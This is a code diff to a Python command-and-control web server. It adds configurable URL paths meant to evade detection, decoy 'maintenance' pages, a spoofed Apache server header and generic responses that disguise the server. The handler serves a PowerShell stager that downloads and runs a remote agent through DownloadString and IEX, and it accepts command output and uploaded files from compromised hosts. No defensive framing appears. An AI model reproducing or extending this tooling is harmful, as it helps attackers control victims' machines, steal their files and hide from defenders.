@@ -9,14 +9,33 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
     """
     Custom HTTP request handler for C2 communications
     Handles client check-ins, commands, and file transfers with encryption
-    Simplified to support only PowerShell Base64 agent
+    Supports customizable URL paths to evade detection
     """
     
-    def __init__(self, request, client_address, server, client_manager, logger, crypto_manager, campaign_name):
+    def __init__(self, request, client_address, server, client_manager, logger, crypto_manager, campaign_name, url_paths=None):
         self.client_manager = client_manager
         self.logger = logger
         self.crypto_manager = crypto_manager
         self.campaign_name = campaign_name
+        
+        # Set default URL paths
+        self.url_paths = {
+            "beacon_path": "/beacon",
+            "agent_path": "/raw_agent",
+            "stager_path": "/b64_stager",
+            "cmd_result_path": "/command_result",
+            "file_upload_path": "/file_upload"
+        }
+        
+        # Update with custom paths if provided
+        if url_paths:
+            self.url_paths.update(url_paths)
+            
+        # Make sure all paths start with '/'
+        for key, path in self.url_paths.items():
+            if not path.startswith('/'):
+                self.url_paths[key] = '/' + path
+                
         super().__init__(request, client_address, server)
 
     def log_message(self, format, *args):
@@ -26,22 +45,41 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
         # Log the request details
         self.log_message(f"Received GET request for {self.path}")
 
-        # Route requests to appropriate handlers
-        handlers = {
-            "/raw_agent": self.send_agent_response,
-            "/b64_stager": self.send_b64_stager_response,
-            "/beacon": self.handle_beacon
-        }
-        
-        # Check for specific handlers
-        if self.path in handlers:
-            handlers[self.path]()
+        # Route requests to appropriate handlers based on custom paths
+        if self.path == self.url_paths["agent_path"]:
+            self.send_agent_response()
+        elif self.path == self.url_paths["stager_path"]:
+            self.send_b64_stager_response()
+        elif self.path == self.url_paths["beacon_path"]:
+            self.handle_beacon()
         else:
-            # Default response for unmatched paths
+            # Default response for unmatched paths - provide a generic 200 response
+            # This helps make the server look like a legitimate web server
             self.send_response(200)
             self.send_header("Content-type", "text/html")
             self.end_headers()
-            message = "<html><body><h1>Welcome to the C2 Webserver!</h1></body></html>"
+            
+            # Return a generic-looking webpage to further avoid detection
+            message = """
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <title>Website</title>
+                <meta name="viewport" content="width=device-width, initial-scale=1">
+                <style>
+                    body { font-family: Arial, sans-serif; margin: 0; padding: 20px; }
+                    .container { max-width: 800px; margin: 0 auto; }
+                    h1 { color: #333; }
+                </style>
+            </head>
+            <body>
+                <div class="container">
+                    <h1>Welcome</h1>
+                    <p>This page is currently under maintenance. Please check back later.</p>
+                </div>
+            </body>
+            </html>
+            """
             self.wfile.write(message.encode("utf-8"))
     
     def handle_beacon(self):
@@ -147,20 +185,34 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
         key_base64 = self.crypto_manager.get_key_base64()
         server_address = f"{self.server.server_address[0]}:{self.server.server_address[1]}"
         
-        # Generate the agent code
-        agent_code = generate_agent_code(key_base64, server_address)
+        # Generate the agent code with custom URL paths
+        agent_code = generate_agent_code(
+            key_base64, 
+            server_address, 
+            beacon_path=self.url_paths["beacon_path"],
+            cmd_result_path=self.url_paths["cmd_result_path"],
+            file_upload_path=self.url_paths["file_upload_path"]
+        )
 
         self.send_response(200)
         self.send_header("Content-type", "text/plain")
+        # Add some legitimate-looking headers to blend in with normal web traffic
+        self.send_header("Cache-Control", "max-age=3600, must-revalidate")
+        self.send_header("Server", "Apache/2.4.41 (Ubuntu)")
         self.end_headers()
         self.wfile.write(agent_code.encode("utf-8"))
 
     def send_b64_stager_response(self):
         """Send a Base64 encoded stager that will download and execute the agent"""
-        raw_agent = "/raw_agent"
-        stager_code = f"$V=new-object net.webclient;$S=$V.DownloadString('http://{self.server.server_address[0]}:{self.server.server_address[1]}{raw_agent}');IEX($S)"
+        # Use the custom agent path
+        agent_path = self.url_paths["agent_path"]
+        stager_code = f"$V=new-object net.webclient;$S=$V.DownloadString('http://{self.server.server_address[0]}:{self.server.server_address[1]}{agent_path}');IEX($S)"
+        
         self.send_response(200)
         self.send_header("Content-type", "text/plain")
+        # Add some legitimate-looking headers to blend in with normal web traffic
+        self.send_header("Cache-Control", "max-age=3600, must-revalidate")
+        self.send_header("Server", "Apache/2.4.41 (Ubuntu)")
         self.end_headers()
         self.wfile.write(stager_code.encode("utf-8"))
 
@@ -169,15 +221,16 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
         # Log the request details
         self.log_message(f"Received POST request for {self.path}")
 
-        if self.path == "/command_result":
+        if self.path == self.url_paths["cmd_result_path"]:
             self.handle_command_result()
-        elif self.path == "/file_upload":
+        elif self.path == self.url_paths["file_upload_path"]:
             self.handle_file_upload()
         else:
-            self.send_response(404)
+            # Return a generic 404 or 200 response to avoid detection
+            self.send_response(200)
             self.send_header("Content-type", "text/plain")
             self.end_headers()
-            self.wfile.write(b"Not Found")
+            self.wfile.write(b"OK")
 
     def handle_command_result(self):
         """Process command results sent from clients"""
@@ -249,13 +302,13 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
             self.send_response(200)
             self.send_header("Content-type", "text/plain")
             self.end_headers()
-            self.wfile.write(b"Command result received.")
+            self.wfile.write(b"OK")  # Simple response to look more generic
         except Exception as e:
             self.logger(f"Error decrypting result from {ip}: {str(e)}")
             self.send_response(400)
             self.send_header("Content-type", "text/plain")
             self.end_headers()
-            self.wfile.write(b"Failed to process command result.")
+            self.wfile.write(b"Bad Request")  # Generic error message
 
     def handle_file_upload(self):
         """Process file uploads from clients"""
@@ -339,11 +392,11 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
             self.send_response(200)
             self.send_header("Content-type", "text/plain")
             self.end_headers()
-            self.wfile.write(b"File upload successful")
+            self.wfile.write(b"OK")  # Simple response to look more generic
             
         except Exception as e:
             self.logger(f"Error handling file upload from {ip}: {str(e)}")
             self.send_response(500)
             self.send_header("Content-type", "text/plain")
             self.end_headers()
-            self.wfile.write(f"File upload failed: {str(e)}".encode('utf-8'))
+            self.wfile.write(b"Server Error")  # Generic error message
